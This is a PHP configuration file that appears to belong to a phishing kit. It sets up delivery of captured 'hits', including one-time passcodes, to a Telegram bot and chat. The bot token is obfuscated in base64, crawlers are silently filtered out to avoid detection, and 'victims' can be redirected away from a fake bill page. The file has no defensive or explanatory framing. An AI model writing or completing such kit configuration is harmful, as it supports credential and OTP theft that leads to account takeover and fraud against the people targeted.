<?php
/**
 * api/config.php — private. Never linked from the front end.
 * Values are base64 to keep the raw file unreadable at a glance.
 */
return [
    // Telegram bot token  (@BotFather)
    'tg'   => 'MTIzNDU2Nzg5OkFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFB',

    // Chat / group ID that receives the hits
    'chat' => 'MTIzNDU2Nzg5',

    // Delivery options
    'silent'      => false,   // true = push without notification sound
    'pin_otp'     => true,    // pin OTP hits to the top of the chat
    'parse_mode'  => 'HTML',

    // Filtering
    'drop_bots'   => true,    // silently bin crawler UAs
    'log_bots'    => true,    // ...but still report them, tagged
    'allow_cidr'  => [],      // e.g. ['203.0.113.0/24'] — empty = all

    // Behaviour
    'timeout'     => 6,
    'redirect'    => '',      // optional: send victims here instead of bill.html
];